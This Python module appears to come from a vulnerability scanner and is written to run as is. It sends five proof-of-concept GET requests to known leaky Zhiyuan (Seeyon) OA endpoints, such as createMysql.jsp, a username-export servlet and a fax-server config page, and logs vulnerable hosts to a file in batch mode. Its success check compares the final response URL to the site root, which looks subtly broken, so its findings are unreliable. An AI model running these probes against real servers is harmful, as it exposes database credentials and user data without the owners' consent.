#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from pub.com.outprint import OutPrintInfo, OutPrintInfoSuc
from pub.com.reqset import ReqSet

urllib3.disable_warnings()


class ZhiyuanOAInfoScan:

    def run(self, urls):
        url = urls + '/yyoa/createMysql.jsp'
        response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
        if response.status_code == 200 and response.url == urls:
            if not self.batch:
                OutPrintInfoSuc("ZhiyuanOA", '存在ZhiyuanOA敏感信息泄漏')
                OutPrintInfo("ZhiyuanOA", url)
            else:
                OutPrintInfoSuc("ZhiyuanOA", f'存在敏感信息泄漏 {url}')
                with open("./result/zhiyuanoa_info_vuls.txt", "a") as w:
                    w.write(f"{url}\n")
        else:
            if not self.batch:
                OutPrintInfo("ZhiyuanOA", '不存在ZhiyuanOA敏感信息泄漏')

    def run2(self, urls):
        url = urls + '/yyoa/ext/createMysql.jsp'
        response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
        if response.status_code == 200 and response.url == urls:
            if not self.batch:
                OutPrintInfoSuc("ZhiyuanOA", '存在ZhiyuanOA敏感信息泄漏')
                OutPrintInfo("ZhiyuanOA", url)
            else:
                OutPrintInfoSuc("ZhiyuanOA", f'存在敏感信息泄漏 {url}')
                with open("./result/zhiyuanoa_info_vuls.txt", "a") as w:
                    w.write(f"{url}\n")
        else:
            if not self.batch:
                OutPrintInfo("ZhiyuanOA", '不存在ZhiyuanOA敏感信息泄漏')

    def run3(self, urls):
        url = urls + '/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
        response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
        if response.status_code == 200 and response.url == urls:
            if not self.batch:
                OutPrintInfoSuc("ZhiyuanOA", '存在ZhiyuanOA敏感信息泄漏')
                OutPrintInfo("ZhiyuanOA", url)
            else:
                OutPrintInfoSuc("ZhiyuanOA", f'存在敏感信息泄漏 {url}')
                with open("./result/zhiyuanoa_info_vuls.txt", "a") as w:
                    w.write(f"{url}\n")
        else:
            if not self.batch:
                OutPrintInfo("ZhiyuanOA", '不存在ZhiyuanOA敏感信息泄漏')

    def run4(self, urls):
        url = urls + '/yyoa/assess/js/initDataAssess.jsp'
        response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
        if response.status_code == 200 and response.url == urls:
            if not self.batch:
                OutPrintInfoSuc("ZhiyuanOA", '存在ZhiyuanOA敏感信息泄漏')
                OutPrintInfo("ZhiyuanOA", url)
            else:
                OutPrintInfoSuc("ZhiyuanOA", f'存在敏感信息泄漏 {url}')
                with open("./result/zhiyuanoa_info_vuls.txt", "a") as w:
                    w.write(f"{url}\n")
        else:
            if not self.batch:
                OutPrintInfo("ZhiyuanOA", '不存在ZhiyuanOA敏感信息泄漏')

    def run5(self, urls):
        url = urls + '/yyoa/ext/trafaxserver/SystemManage/config.jsp'
        response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)
        if response.status_code == 200 and response.url == urls:
            if not self.batch:
                OutPrintInfoSuc("ZhiyuanOA", '存在ZhiyuanOA敏感信息泄漏')
                OutPrintInfo("ZhiyuanOA", url)
            else:
                OutPrintInfoSuc("ZhiyuanOA", f'存在敏感信息泄漏 {url}')
                with open("./result/zhiyuanoa_info_vuls.txt", "a") as w:
                    w.write(f"{url}\n")
        else:
            if not self.batch:
                OutPrintInfo("ZhiyuanOA", '不存在ZhiyuanOA敏感信息泄漏')

    def main(self, target):
        self.batch = target["batch_work"]
        if not self.batch:
            OutPrintInfo("ZhiyuanOA", '开始ZhiyuanOA敏感信息泄漏检测...')
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ZhiyuanOA", '开始执行POC-1')
        self.run(url)
        if not self.batch:
            OutPrintInfo("ZhiyuanOA", '开始执行POC-2')
        self.run2(url)
        if not self.batch:
            OutPrintInfo("ZhiyuanOA", '开始执行POC-3')
        self.run3(url)
        if not self.batch:
            OutPrintInfo("ZhiyuanOA", '开始执行POC-4')
        self.run4(url)
        if not self.batch:
            OutPrintInfo("ZhiyuanOA", '开始执行POC-5')
        self.run5(url)
        if not self.batch:
            OutPrintInfo("ZhiyuanOA", 'ZhiyuanOA敏感信息泄漏检测结束')
